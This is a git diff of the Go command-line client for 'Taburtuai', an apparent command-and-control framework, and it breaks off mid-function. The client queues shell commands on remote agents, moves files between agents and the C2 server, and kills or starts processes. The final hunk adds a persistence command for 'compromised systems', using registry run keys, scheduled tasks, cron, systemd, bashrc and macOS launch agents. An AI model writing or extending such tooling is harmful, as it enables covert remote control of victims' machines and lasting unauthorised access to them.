@@ -132,15 +132,35 @@ var agentsListCmd = &cobra.Command{
 			os.Exit(1)
 		}
 
+		// Debug print untuk melihat struktur response
+		if verbose {
+			printVerbose(fmt.Sprintf("Full response data: %+v", response.Data))
+		}
+
 		data, ok := response.Data.(map[string]interface{})
-		if !ok || data["agents"] == nil {
-			printWarning("No agent data in response or invalid format.")
+		if !ok {
+			printWarning("No data in response or invalid format.")
 			return
 		}
 
-		agentsInterface, ok := data["agents"].([]interface{})
-		if !ok {
-			printWarning("Agent data is not in the expected list format.")
+		// Cek apakah ada nested "result" structure
+		var agentsInterface []interface{}
+
+		// Try to get agents from nested structure first (server's current format)
+		if result, hasResult := data["result"].(map[string]interface{}); hasResult {
+			if agents, hasAgents := result["agents"].([]interface{}); hasAgents {
+				agentsInterface = agents
+				printVerbose("Found agents in nested result structure")
+			}
+		} else if agents, hasDirectAgents := data["agents"].([]interface{}); hasDirectAgents {
+			// Fallback to direct agents structure
+			agentsInterface = agents
+			printVerbose("Found agents in direct structure")
+		}
+
+		if agentsInterface == nil {
+			printWarning("No agent data found in response.")
+			printVerbose(fmt.Sprintf("Available keys in data: %v", getMapKeys(data)))
 			return
 		}
 
@@ -163,8 +183,8 @@ var agentsListCmd = &cobra.Command{
 			}
 
 			agentID := getStringFromMap(a, "id")
-			if len(agentID) > 35 { // Sesuaikan jika UUID penuh
-				agentID = agentID[:8] + "..." // Ringkas jika terlalu panjang
+			if len(agentID) > 35 {
+				agentID = agentID[:8] + "..."
 			}
 
 			hostname := getStringFromMap(a, "hostname")
@@ -194,6 +214,14 @@ var agentsListCmd = &cobra.Command{
 				agentID, hostname, username, statusColor, status, ColorReset, lastSeen)
 		}
 	},
+}
+
+func getMapKeys(m map[string]interface{}) []string {
+	keys := make([]string, 0, len(m))
+	for k := range m {
+		keys = append(keys, k)
+	}
+	return keys
 }
 
 var agentsInfoCmd = &cobra.Command{
@@ -269,20 +297,22 @@ var cmdCmd = &cobra.Command{
 
 		reqBody := map[string]interface{}{
 			"agent_id": agentID,
-			"command":  commandStr, // Ini akan dieksekusi sebagai satu baris perintah oleh agent
-			"timeout":  timeout,    // Server akan menggunakan default jika 0
+			"command":  commandStr,
+			"timeout":  timeout,
 		}
 		if workDir != "" {
 			reqBody["working_dir"] = workDir
 		}
-		// Untuk argumen terpisah, agent perlu parsing atau server perlu mengirim struktur berbeda.
-		// Saat ini, agent mengharapkan `command` sebagai string tunggal.
 
 		reqJSON, _ := json.Marshal(reqBody)
 		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/command", bytes.NewBuffer(reqJSON), "application/json")
 		if err != nil {
 			printError(fmt.Sprintf("Failed to send command to server: %v", err))
 			os.Exit(1)
+		}
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Command response: %s", string(serverRespBytes)))
 		}
 
 		var apiResp APIResponse
@@ -296,19 +326,20 @@ var cmdCmd = &cobra.Command{
 			os.Exit(1)
 		}
 
-		dataMap, ok := apiResp.Data.(map[string]interface{})
-		if !ok || dataMap["command_id"] == nil {
-			printError("Invalid command data format from server.")
+		// BAGIAN YANG DIGANTI - gunakan extractCommandID helper function
+		commandID, err := extractCommandID(apiResp, "execute")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
 			os.Exit(1)
 		}
-		commandID := dataMap["command_id"].(string)
+
 		printSuccess(fmt.Sprintf("Command queued. Command ID: %s", commandID))
 
 		if background {
 			printInfo(fmt.Sprintf("Running in background. Check status with: taburtuai-cli status %s", commandID))
 		} else {
 			printInfo("Waiting for command execution to complete...")
-			waitForCommand(commandID, timeout) // Gunakan timeout perintah sebagai batas tunggu
+			waitForCommand(commandID, timeout)
 		}
 	},
 }
@@ -361,24 +392,43 @@ var statusCmd = &cobra.Command{
 			printError(fmt.Sprintf("Failed to get command status: %v", err))
 			os.Exit(1)
 		}
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Status response: %s", string(body)))
+		}
+
 		var response APIResponse
 		if err := json.Unmarshal(body, &response); err != nil {
 			printError(fmt.Sprintf("Failed to parse status response: %v. Raw: %s", err, string(body)))
 			os.Exit(1)
 		}
+
 		if !response.Success {
 			printError(fmt.Sprintf("Error getting command status: %s", response.Error))
 			os.Exit(1)
 		}
+
 		if response.Data == nil {
 			printError("No data found for this command status.")
 			return
 		}
-		cmdData, ok := response.Data.(map[string]interface{})
-		if !ok {
+
+		// Handle nested response structure
+		var cmdData map[string]interface{}
+		if dataMap, ok := response.Data.(map[string]interface{}); ok {
+			// Check for nested result structure first
+			if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
+				cmdData = result
+				printVerbose("Found command status in nested result structure")
+			} else {
+				cmdData = dataMap
+				printVerbose("Found command status in direct structure")
+			}
+		} else {
 			printError("Invalid command data format for status.")
 			return
 		}
+
 		displayFinalCommandStatus(cmdData, commandID)
 	},
 }
@@ -405,24 +455,46 @@ var historyCmd = &cobra.Command{
 			printError(fmt.Sprintf("Failed to get command history: %v", err))
 			os.Exit(1)
 		}
+
+		if verbose {
+			printVerbose(fmt.Sprintf("History response: %s", string(body)))
+		}
+
 		var response APIResponse
 		if err := json.Unmarshal(body, &response); err != nil {
 			printError(fmt.Sprintf("Failed to parse history response: %v. Raw: %s", err, string(body)))
 			os.Exit(1)
 		}
+
 		if !response.Success {
 			printError(fmt.Sprintf("Error getting history: %s", response.Error))
 			os.Exit(1)
 		}
 
-		dataMap, ok := response.Data.(map[string]interface{})
-		if !ok || dataMap["commands"] == nil {
-			printWarning("No command history data in response or invalid format.")
-			return
+		// Handle nested response structure
+		var commandsInterface []interface{}
+		if response.Data != nil {
+			if dataMap, ok := response.Data.(map[string]interface{}); ok {
+				// Check for nested result structure first
+				if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
+					if commands, hasCommands := result["commands"].([]interface{}); hasCommands {
+						commandsInterface = commands
+						printVerbose("Found commands in nested result structure")
+					}
+				} else if commands, hasCommands := dataMap["commands"].([]interface{}); hasCommands {
+					commandsInterface = commands
+					printVerbose("Found commands in direct structure")
+				}
+			}
 		}
-		commandsInterface, ok := dataMap["commands"].([]interface{})
-		if !ok {
-			printWarning("Command history is not in the expected list format.")
+
+		if commandsInterface == nil {
+			printWarning("No command history data in response or invalid format.")
+			if verbose && response.Data != nil {
+				if dataMap, ok := response.Data.(map[string]interface{}); ok {
+					printVerbose(fmt.Sprintf("Available keys in data: %v", getMapKeys(dataMap)))
+				}
+			}
 			return
 		}
 
@@ -430,6 +502,7 @@ var historyCmd = &cobra.Command{
 			printWarning("No command history found for this agent with current filters.")
 			return
 		}
+
 		printSuccess(fmt.Sprintf("Found %d command(s) in history.", len(commandsInterface)))
 		fmt.Println()
 		fmt.Printf("%s%-12s %-20s %-10s %-8s %-30s%s\n",
@@ -442,7 +515,11 @@ var historyCmd = &cobra.Command{
 				continue
 			}
 
-			cmdID := getStringFromMap(cmdMap, "id")[:8] + "..."
+			cmdID := getStringFromMap(cmdMap, "id")
+			if len(cmdID) > 8 {
+				cmdID = cmdID[:8] + "..."
+			}
+
 			timestamp := "N/A"
 			if tsStr := getStringFromMap(cmdMap, "executed_at"); tsStr != "" {
 				t, _ := time.Parse(time.RFC3339, tsStr)
@@ -451,6 +528,7 @@ var historyCmd = &cobra.Command{
 				t, _ := time.Parse(time.RFC3339, tsStr)
 				timestamp = t.Format("01-02 15:04:05") + " (Q)"
 			}
+
 			status := getStringFromMap(cmdMap, "status")
 			var statusColor string
 			switch status {
@@ -465,14 +543,17 @@ var historyCmd = &cobra.Command{
 			default:
 				statusColor = ColorWhite
 			}
+
 			exitCode := "-"
 			if ecVal, ecOK := cmdMap["exit_code"]; ecOK {
 				exitCode = fmt.Sprintf("%.0f", ecVal.(float64))
 			}
+
 			commandStr := getStringFromMap(cmdMap, "command")
 			if len(commandStr) > 28 {
 				commandStr = commandStr[:25] + "..."
 			}
+
 			fmt.Printf("%-12s %-20s %s%-10s%s %-8s %-30s\n",
 				cmdID, timestamp, statusColor, status, ColorReset, exitCode, commandStr)
 		}
@@ -614,24 +695,61 @@ The file is first sent to the C2 server, which then tasks the agent to store it.
 		defer resp.Body.Close()
 
 		respBody, _ := io.ReadAll(resp.Body)
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Upload response status: %d", resp.StatusCode))
+			printVerbose(fmt.Sprintf("Upload response body: %s", string(respBody)))
+		}
+
+		if resp.StatusCode < 200 || resp.StatusCode >= 300 {
+			printError(fmt.Sprintf("Upload request failed with status %d: %s", resp.StatusCode, string(respBody)))
+			os.Exit(1)
+		}
+
 		var apiResp APIResponse
-		_ = json.Unmarshal(respBody, &apiResp)
+		if err := json.Unmarshal(respBody, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse upload response: %v. Raw: %s", err, string(respBody)))
+			os.Exit(1)
+		}
 
 		if !apiResp.Success {
 			printError(fmt.Sprintf("Server error during upload tasking: %s", apiResp.Error))
 			os.Exit(1)
 		}
-		dataMap, ok := apiResp.Data.(map[string]interface{})
-		if !ok || dataMap["command_id"] == nil {
-			printError("Invalid command data from server for upload.")
+
+		// Extract command_id using helper function
+		commandID, err := extractCommandID(apiResp, "upload")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id from upload response: %v", err))
 			os.Exit(1)
 		}
-		commandID := dataMap["command_id"].(string)
+
 		printSuccess(fmt.Sprintf("Upload command queued. Command ID: %s", commandID))
 
 		if wait {
 			printInfo("Waiting for upload to complete on agent...")
-			waitForCommand(commandID, 300) // Timeout 5 menit
+			finalStatusData := waitForCommand(commandID, 300) // Timeout 5 menit
+			if finalStatusData != nil {
+				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
+					status := getStringFromMap(statusMap, "status")
+					output := getStringFromMap(statusMap, "output")
+					errorMsg := getStringFromMap(statusMap, "error")
+
+					if status == "completed" {
+						if output != "" {
+							printSuccess(fmt.Sprintf("Upload completed: %s", output))
+						} else {
+							printSuccess(fmt.Sprintf("File '%s' uploaded successfully to '%s'", filepath.Base(localFilePath), remotePathOnAgent))
+						}
+					} else if status == "failed" {
+						if errorMsg != "" {
+							printError(fmt.Sprintf("Upload failed: %s", errorMsg))
+						} else {
+							printError(fmt.Sprintf("Failed to upload file '%s'", filepath.Base(localFilePath)))
+						}
+					}
+				}
+			}
 		} else {
 			printInfo(fmt.Sprintf("Check status with: taburtuai-cli status %s", commandID))
 		}
@@ -663,8 +781,6 @@ To get the file to your CLI machine, further steps might be needed if CLI and Se
 			os.Exit(1)
 		}
 
-		// Variabel serverURL lokal DIHAPUS karena tidak digunakan.
-		// endpoint yang benar akan digabungkan dengan config.ServerURL di dalam makeAPIRequestWithMethod
 		endpoint := fmt.Sprintf("/api/v1/agent/%s/download", agentID)
 		serverRespBytes, err := makeAPIRequestWithMethod("POST", endpoint, bytes.NewBuffer(jsonPayload), "application/json")
 		if err != nil {
@@ -672,34 +788,28 @@ To get the file to your CLI machine, further steps might be needed if CLI and Se
 			os.Exit(1)
 		}
 
+		if verbose {
+			printVerbose(fmt.Sprintf("Download response: %s", string(serverRespBytes)))
+		}
+
 		var apiResp APIResponse
-		if errUnmarshal := json.Unmarshal(serverRespBytes, &apiResp); errUnmarshal != nil {
-			printError(fmt.Sprintf("Failed to parse server response for download task (CommandID may be missing): %v. Raw: %s", errUnmarshal, string(serverRespBytes)))
-			// Tetap lanjutkan untuk mencoba mendapatkan CommandID jika formatnya sedikit berbeda tapi masih ada
+		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse download response: %v. Raw: %s", err, string(serverRespBytes)))
+			os.Exit(1)
 		}
 
-		if !apiResp.Success { // Periksa setelah potensi unmarshal error
+		if !apiResp.Success {
 			printError(fmt.Sprintf("Server error during download tasking: %s", apiResp.Error))
-			// Jika ada error dari server, mungkin tidak ada command_id
-			// Jadi kita keluar di sini jika server mengindikasikan kegagalan awal
-			if apiResp.Data == nil {
-				os.Exit(1)
-			}
-			// Coba periksa apakah ada command_id meskipun gagal, untuk status checking
-			if dataMap, ok := apiResp.Data.(map[string]interface{}); ok {
-				if cmdID, idOK := dataMap["command_id"].(string); idOK && cmdID != "" {
-					printWarning(fmt.Sprintf("Server reported error, but command ID %s was issued. You can try to check its status.", cmdID))
-				}
-			}
 			os.Exit(1)
 		}
 
-		dataMap, ok := apiResp.Data.(map[string]interface{})
-		if !ok || dataMap["command_id"] == nil {
-			printError("Invalid or missing command data from server for download task.")
+		// Extract command_id using helper function
+		commandID, err := extractCommandID(apiResp, "download")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id from download response: %v", err))
 			os.Exit(1)
 		}
-		commandID := dataMap["command_id"].(string)
+
 		printSuccess(fmt.Sprintf("Download command queued. Command ID: %s", commandID))
 		printInfo(fmt.Sprintf("The file will be sent from agent to C2 server and saved at/near '%s' on the server.", pathOnServerToSave))
 
@@ -708,13 +818,25 @@ To get the file to your CLI machine, further steps might be needed if CLI and Se
 			finalStatusData := waitForCommand(commandID, 600) // Timeout 10 menit
 			if finalStatusData != nil {
 				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
-					if serverMsg, ok := statusMap["output"].(string); ok && strings.Contains(serverMsg, "File successfully downloaded from agent and saved to server") {
-						printSuccess(serverMsg)
-						printInfo("File is now on the C2 server. If CLI is on a different machine, retrieve it from the server manually or via a future 'get-staged-file' command.")
-					} else if errMsg, ok := statusMap["error"].(string); ok && errMsg != "" {
-						printError(fmt.Sprintf("Download operation reported an error: %s", errMsg))
-					} else if statusMap["status"] == "completed" { // Jika completed tapi tidak ada pesan output spesifik
-						printSuccess(fmt.Sprintf("Download command %s completed. Check server path '%s'.", commandID, pathOnServerToSave))
+					status := getStringFromMap(statusMap, "status")
+					output := getStringFromMap(statusMap, "output")
+					errorMsg := getStringFromMap(statusMap, "error")
+
+					if status == "completed" {
+						if output != "" && strings.Contains(output, "File successfully downloaded from agent and saved to server") {
+							printSuccess(output)
+							printInfo("File is now on the C2 server. If CLI is on a different machine, retrieve it from the server manually or via a future 'get-staged-file' command.")
+						} else if output != "" {
+							printSuccess(fmt.Sprintf("Download completed: %s", output))
+						} else {
+							printSuccess(fmt.Sprintf("Download command %s completed. Check server path '%s'.", commandID, pathOnServerToSave))
+						}
+					} else if status == "failed" {
+						if errorMsg != "" {
+							printError(fmt.Sprintf("Download operation reported an error: %s", errorMsg))
+						} else {
+							printError(fmt.Sprintf("Failed to download file '%s'", remoteFileOnAgent))
+						}
 					}
 				}
 			}
@@ -730,42 +852,103 @@ var logsCmd = &cobra.Command{
 	Short: "Show server logs",
 	Run: func(cmd *cobra.Command, args []string) {
 		limit, _ := cmd.Flags().GetInt("limit")
+		level, _ := cmd.Flags().GetString("level")
+		category, _ := cmd.Flags().GetString("category")
+
 		printInfo(fmt.Sprintf("Fetching last %d log entries...", limit))
-		body, err := makeAPIRequest(fmt.Sprintf("/api/v1/logs?count=%d", limit)) // server uses 'count'
+
+		// Build query parameters
+		queryParams := fmt.Sprintf("?count=%d", limit)
+		if level != "" {
+			queryParams += "&level=" + level
+		}
+		if category != "" {
+			queryParams += "&category=" + category
+		}
+
+		endpoint := "/api/v1/logs" + queryParams
+		if verbose {
+			printVerbose(fmt.Sprintf("Requesting logs from: %s", endpoint))
+		}
+
+		body, err := makeAPIRequest(endpoint)
 		if err != nil {
 			printError(fmt.Sprintf("Failed to fetch logs: %v", err))
 			os.Exit(1)
 		}
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Logs response: %s", string(body)))
+		}
+
 		var response APIResponse
 		if err := json.Unmarshal(body, &response); err != nil {
 			printError(fmt.Sprintf("Failed to parse logs response: %v. Raw: %s", err, string(body)))
 			os.Exit(1)
 		}
+
 		if !response.Success {
 			printError(fmt.Sprintf("Error fetching logs: %s", response.Error))
 			os.Exit(1)
 		}
-		logsInterface, ok := response.Data.([]interface{})
-		if !ok {
-			printWarning("Log data is not in the expected list format.")
+
+		// Handle nested response structure for logs
+		var logsInterface []interface{}
+		if response.Data != nil {
+			if dataMap, ok := response.Data.(map[string]interface{}); ok {
+				// Check for nested result structure first
+				if result, hasResult := dataMap["result"].(map[string]interface{}); hasResult {
+					if logs, hasLogs := result["logs"].([]interface{}); hasLogs {
+						logsInterface = logs
+						printVerbose("Found logs in nested result structure")
+					} else if entries, hasEntries := result["entries"].([]interface{}); hasEntries {
+						logsInterface = entries
+						printVerbose("Found log entries in nested result structure")
+					}
+				} else if logs, hasLogs := dataMap["logs"].([]interface{}); hasLogs {
+					logsInterface = logs
+					printVerbose("Found logs in direct structure")
+				} else if entries, hasEntries := dataMap["entries"].([]interface{}); hasEntries {
+					logsInterface = entries
+					printVerbose("Found log entries in direct structure")
+				}
+			} else if directLogs, isArray := response.Data.([]interface{}); isArray {
+				// Try direct array from response.Data
+				logsInterface = directLogs
+				printVerbose("Found logs as direct array from response.Data")
+			}
+		}
+
+		if logsInterface == nil {
+			printWarning("No log data found in response.")
+			if verbose && response.Data != nil {
+				if dataMap, ok := response.Data.(map[string]interface{}); ok {
+					printVerbose(fmt.Sprintf("Available keys in response data: %v", getMapKeys(dataMap)))
+				}
+			}
 			return
 		}
+
 		if len(logsInterface) == 0 {
 			printWarning("No logs found.")
 			return
 		}
+
 		printSuccess(fmt.Sprintf("Showing %d log entries:", len(logsInterface)))
 		fmt.Println()
+
 		for _, logEntry := range logsInterface {
 			entry, ok := logEntry.(map[string]interface{})
 			if !ok {
 				continue
 			}
+
 			timestamp := getStringFromMap(entry, "timestamp")
 			level := getStringFromMap(entry, "level")
 			category := getStringFromMap(entry, "category")
 			message := getStringFromMap(entry, "message")
 			agentID := getStringFromMap(entry, "agent_id")
+
 			var levelColor string
 			switch level {
 			case "INFO":
@@ -774,14 +957,19 @@ var logsCmd = &cobra.Command{
 				levelColor = ColorYellow
 			case "ERROR", "CRITICAL":
 				levelColor = ColorRed
+			case "DEBUG":
+				levelColor = ColorPurple
 			default:
 				levelColor = ColorWhite
 			}
+
 			logLine := fmt.Sprintf("%s[%s]%s [%s] [%s] %s",
 				levelColor, level, ColorReset, timestamp, category, message)
+
 			if agentID != "" {
 				logLine += fmt.Sprintf(" (Agent: %s)", agentID[:min(len(agentID), 8)])
 			}
+
 			fmt.Println(logLine)
 		}
 	},
@@ -847,7 +1035,7 @@ var versionCmd = &cobra.Command{
 	Short: "Show CLI version",
 	Run: func(cmd *cobra.Command, args []string) {
 		fmt.Printf("%sTaburtuai CLI%s\n", ColorGreen, ColorReset)
-		fmt.Println("Version: 2.0 - Phase 2 (with File Ops)") // Perbarui versi jika perlu
+		fmt.Println("Version: 2.0 - Phase 2 (with File Ops)")
 		fmt.Printf("Target Server: %s\n", config.ServerURL)
 		apiKeyStatus := "Not Configured"
 		if config.APIKey != "" {
@@ -870,32 +1058,41 @@ var processListCmd = &cobra.Command{
 	Run: func(cmd *cobra.Command, args []string) {
 		agentID := args[0]
 		printInfo(fmt.Sprintf("Requesting process list from agent %s...", agentID))
-		// Buat JSON payload (kosong untuk list)
+
+		// Buat JSON payload kosong untuk list
 		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/list", nil, "application/json")
-		// ... (handle response, queue command, waitForCommand, tampilkan hasil) ...
-		// Hasil dari agent (result.Output) akan berisi string (mungkin JSON string dari PowerShell, atau teks dari ps)
-		// CLI perlu menampilkannya, atau jika JSON, bisa di-parse dan ditampilkan lebih rapi.
-		// (Implementasi lengkap Run function akan serupa dengan cmdCmd)
 		if err != nil {
 			printError(fmt.Sprintf("Failed to send process list request: %v", err))
 			os.Exit(1)
 		}
-		var apiResp APIResponse
-		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil { /* ... error handling ... */
-			return
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Process list response: %s", string(serverRespBytes)))
 		}
-		if !apiResp.Success {
-			printError("Server error: " + apiResp.Error)
+
+		var apiResp APIResponse
+		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse process list response: %v. Raw: %s", err, string(serverRespBytes)))
 			os.Exit(1)
 		}
 
-		dataMap, _ := apiResp.Data.(map[string]interface{})
-		commandID, _ := dataMap["command_id"].(string)
-		printSuccess("Process list command queued. ID: " + commandID)
+		if !apiResp.Success {
+			printError(fmt.Sprintf("Server error: %s", apiResp.Error))
+			os.Exit(1)
+		}
+
+		// Handle nested response structure
+		commandID, err := extractCommandID(apiResp, "process_start")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
+			os.Exit(1)
+		}
+
+		printSuccess(fmt.Sprintf("Process list command queued. ID: %s", commandID))
 
 		wait, _ := cmd.Flags().GetBool("wait")
 		if wait {
-			finalStatusData := waitForCommand(commandID, 60) // Tunggu 60 detik
+			finalStatusData := waitForCommand(commandID, 60)
 			if finalStatusData != nil {
 				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
 					output, _ := statusMap["output"].(string)
@@ -905,12 +1102,27 @@ var processListCmd = &cobra.Command{
 						var processesInfo []map[string]interface{}
 						if errJson := json.Unmarshal([]byte(output), &processesInfo); errJson == nil {
 							// Tampilkan dalam format tabel yang lebih bagus jika berhasil diparse
+							fmt.Printf("%s%-8s %-25s %-40s %-30s%s\n",
+								ColorBlue, "PID", "NAME", "PATH", "DESCRIPTION", ColorReset)
+							fmt.Println(strings.Repeat("-", 110))
 							for _, p := range processesInfo {
 								id := getFloatFromMap(p, "Id")
 								name := getStringFromMap(p, "ProcessName")
-								path := getStringFromMap(p, "Path")        // Mungkin kosong
-								desc := getStringFromMap(p, "Description") // Mungkin kosong
-								fmt.Printf("  PID: %-6.0f Name: %-25s Path: %-40s Desc: %s\n", id, name, path, desc)
+								path := getStringFromMap(p, "Path")
+								desc := getStringFromMap(p, "Description")
+
+								// Truncate long strings
+								if len(name) > 24 {
+									name = name[:21] + "..."
+								}
+								if len(path) > 39 {
+									path = path[:36] + "..."
+								}
+								if len(desc) > 29 {
+									desc = desc[:26] + "..."
+								}
+
+								fmt.Printf("%-8.0f %-25s %-40s %-30s\n", id, name, path, desc)
 							}
 						} else {
 							// Jika bukan JSON atau gagal parse, tampilkan apa adanya
@@ -920,7 +1132,7 @@ var processListCmd = &cobra.Command{
 				}
 			}
 		} else {
-			printInfo("Use 'status " + commandID + "' to check.")
+			printInfo(fmt.Sprintf("Use 'taburtuai-cli status %s' to check.", commandID))
 		}
 	},
 }
@@ -952,27 +1164,60 @@ var processKillCmd = &cobra.Command{
 
 		jsonPayload, _ := json.Marshal(payload)
 		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/kill", bytes.NewBuffer(jsonPayload), "application/json")
-		// ... (handle response, queue command, waitForCommand) ...
 		if err != nil {
 			printError(fmt.Sprintf("Request failed: %v", err))
 			os.Exit(1)
 		}
-		var apiResp APIResponse
-		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil { /*...*/
-			return
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Process kill response: %s", string(serverRespBytes)))
 		}
-		if !apiResp.Success {
-			printError("Server error: " + apiResp.Error)
+
+		var apiResp APIResponse
+		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse process kill response: %v. Raw: %s", err, string(serverRespBytes)))
 			os.Exit(1)
 		}
 
-		dataMap, _ := apiResp.Data.(map[string]interface{})
-		commandID, _ := dataMap["command_id"].(string)
-		printSuccess("Process kill command queued. ID: " + commandID)
-		if wait, _ := cmd.Flags().GetBool("wait"); wait {
-			waitForCommand(commandID, 30)
+		if !apiResp.Success {
+			printError(fmt.Sprintf("Server error: %s", apiResp.Error))
+			os.Exit(1)
+		}
+
+		commandID, err := extractCommandID(apiResp, "process_kill")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
+			os.Exit(1)
+		}
+
+		printSuccess(fmt.Sprintf("Process kill command queued. ID: %s", commandID))
+
+		wait, _ := cmd.Flags().GetBool("wait")
+		if wait {
+			finalStatusData := waitForCommand(commandID, 30)
+			if finalStatusData != nil {
+				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
+					status := getStringFromMap(statusMap, "status")
+					output := getStringFromMap(statusMap, "output")
+					errorMsg := getStringFromMap(statusMap, "error")
+
+					if status == "completed" {
+						if output != "" {
+							printSuccess(fmt.Sprintf("Process kill completed: %s", output))
+						} else {
+							printSuccess(fmt.Sprintf("Process %s killed successfully", targetLog))
+						}
+					} else if status == "failed" {
+						if errorMsg != "" {
+							printError(fmt.Sprintf("Process kill failed: %s", errorMsg))
+						} else {
+							printError(fmt.Sprintf("Failed to kill process %s", targetLog))
+						}
+					}
+				}
+			}
 		} else {
-			printInfo("Use 'status " + commandID + "' to check.")
+			printInfo(fmt.Sprintf("Use 'taburtuai-cli status %s' to check.", commandID))
 		}
 	},
 }
@@ -993,27 +1238,322 @@ var processStartCmd = &cobra.Command{
 		}
 		jsonPayload, _ := json.Marshal(payload)
 		serverRespBytes, err := makeAPIRequestWithMethod("POST", "/api/v1/agent/"+agentID+"/process/start", bytes.NewBuffer(jsonPayload), "application/json")
-		// ... (handle response, queue command, waitForCommand) ...
 		if err != nil {
 			printError(fmt.Sprintf("Request failed: %v", err))
 			os.Exit(1)
 		}
-		var apiResp APIResponse
-		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil { /*...*/
-			return
+
+		if verbose {
+			printVerbose(fmt.Sprintf("Process start response: %s", string(serverRespBytes)))
 		}
-		if !apiResp.Success {
-			printError("Server error: " + apiResp.Error)
+
+		var apiResp APIResponse
+		if err := json.Unmarshal(serverRespBytes, &apiResp); err != nil {
+			printError(fmt.Sprintf("Failed to parse process start response: %v. Raw: %s", err, string(serverRespBytes)))
 			os.Exit(1)
 		}
 
-		dataMap, _ := apiResp.Data.(map[string]interface{})
-		commandID, _ := dataMap["command_id"].(string)
-		printSuccess("Process start command queued. ID: " + commandID)
-		if wait, _ := cmd.Flags().GetBool("wait"); wait {
-			waitForCommand(commandID, 30)
+		if !apiResp.Success {
+			printError(fmt.Sprintf("Server error: %s", apiResp.Error))
+			os.Exit(1)
+		}
+
+		commandID, err := extractCommandID(apiResp, "process_list")
+		if err != nil {
+			printError(fmt.Sprintf("Failed to extract command_id: %v", err))
+			os.Exit(1)
+		}
+
+		printSuccess(fmt.Sprintf("Process start command queued. ID: %s", commandID))
+
+		wait, _ := cmd.Flags().GetBool("wait")
+		if wait {
+			finalStatusData := waitForCommand(commandID, 30)
+			if finalStatusData != nil {
+				if statusMap, ok := finalStatusData.(map[string]interface{}); ok {
+					status := getStringFromMap(statusMap, "status")
+					output := getStringFromMap(statusMap, "output")
+					errorMsg := getStringFromMap(statusMap, "error")
+
+					if status == "completed" {
+						if output != "" {
+							printSuccess(fmt.Sprintf("Process start completed: %s", output))
+						} else {
+							printSuccess(fmt.Sprintf("Process '%s' started successfully", procPath))
+						}
+					} else if status == "failed" {
+						if errorMsg != "" {
+							printError(fmt.Sprintf("Process start failed: %s", errorMsg))
+						} else {
+							printError(fmt.Sprintf("Failed to start process '%s'", procPath))
+						}
+					}
+				}
+			}
 		} else {
-			printInfo("Use 'status " + commandID + "' to check.")
+			printInfo(fmt.Sprintf("Use 'taburtuai-cli status %s' to check.", commandID))
+		}
+	},
+}
+
+var persistenceCmd = &cobra.Command{
+	Use:   "persistence",
+	Short: "Manage persistence mechanisms on agents",
+	Long:  "Setup or remove persistence mechanisms to maintain access on compromised systems",
+}
+
+var persistenceSetupCmd = &cobra.Command{
+	Use:   "setup <agent-id>",
+	Short: "Setup persistence mechanism on agent",
+	Long: `Setup persistence mechanism on the specified agent to maintain access.
+
+Available methods:
+  Windows:
+    - registry_run: Add to registry run key
+    - schtasks_onlogon: Scheduled task on logon
+    - schtasks_daily: Daily scheduled task
+    - startup_folder: Windows startup folder
+
+  Linux:
+    - cron_reboot: Cron job on reboot
+    - systemd_user: Systemd user service
+    - bashrc: Add to bashrc
+
+  macOS:
+    - launchagent: Launch agent plist`,
+	Args: cobra.ExactArgs(1),
+	Run: func(cmd *cobra.Command, args []string) {
+		agentID := args[0]
+
+		method, _ := cmd.Flags().GetString("method")
+		name, _ := cmd.Flags().GetString("name")
+		processPath, _ := cmd.Flags().GetString("path")
+		processArgs, _ := cmd.Flags().GetString("args")
+		wait, _ := cmd.Flags().GetBool("wait")
+
+		// Validate method
+		validMethods := map[string]bool{
+			// Windows methods
+			"registry_run":     true,
+			"schtasks_onlogon": true,
+			"schtasks_daily":   true,
+			"startup_folder":   true,
+			// Linux methods
+			"cron_reboot":  true,
+			"systemd_user": true,
+			"bashrc":       true,
+			// macOS methods
+			"launchagent": true,
+		}
+
+		if !validMethods[method] {
+			printError("Invalid persistence method. Available methods:")
+			printError("Windows: registry_run, schtasks_onlogon, schtasks_daily, startup_folder")
+			printError("Linux: cron_reboot, systemd_user, bashrc")
+			printError("macOS: launchagent")
+			os.Exit(1)
+		}
+
+		if processPath == "" {
+			printError("--path is required (path to executable for persistence)")
+			os.Exit(1)
+		}
+
+		printInfo(fmt.Sprintf("Setting up %s persistence '%s' on agent %s...", method, name, agentID))
+		printVerbose(fmt.Sprintf("Method: %s, Name: %s, Path: %s, Args: %s", method, name, processPath, processArgs))
+
+		payload := map[string]interface{}{
+			"persist_method": method,
+			"process_path":   processPath,
+		}
+
+		if name != "" {
+			payload["persist_name"] = name
+		}
+
+		if processArgs != "" {
+			payload["process_args"] = processArgs
+		}
+
+		jsonPayload, err := json.Marshal(payload)
+		if err != nil {
+			printError(fmt.Sprintf("Failed to marshal persistence setup payload: %v", err))
+			os.Exit(1)
+		}
+
